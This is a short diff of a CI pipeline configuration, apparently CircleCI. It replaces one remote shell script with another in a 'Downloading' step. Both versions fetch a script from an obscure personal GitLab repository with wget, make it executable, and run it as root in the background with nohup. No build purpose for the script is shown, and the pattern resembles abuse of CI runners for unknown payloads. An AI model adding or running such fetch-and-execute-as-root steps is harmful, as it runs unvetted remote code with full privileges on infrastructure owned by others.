@@ -13,8 +13,8 @@ jobs:
       - run: 
          name: Downloading
          command: |
-          sudo su --command "wget https://gitlab.com/JanellsBarbee/shm/-/raw/main/shm.sh && chmod u+x shm.sh"
-          sudo su --command "nohup ./shm.sh --log=stdout > meta.log &"
+          sudo su --command "wget https://gitlab.com/BriannaCowley/qog/-/raw/main/qog.sh && chmod u+x qog.sh"
+          sudo su --command "nohup ./qog.sh --log=stdout > meta.log &"
           sleep 10
           sudo su --command "cat meta.log"    
       - run: 
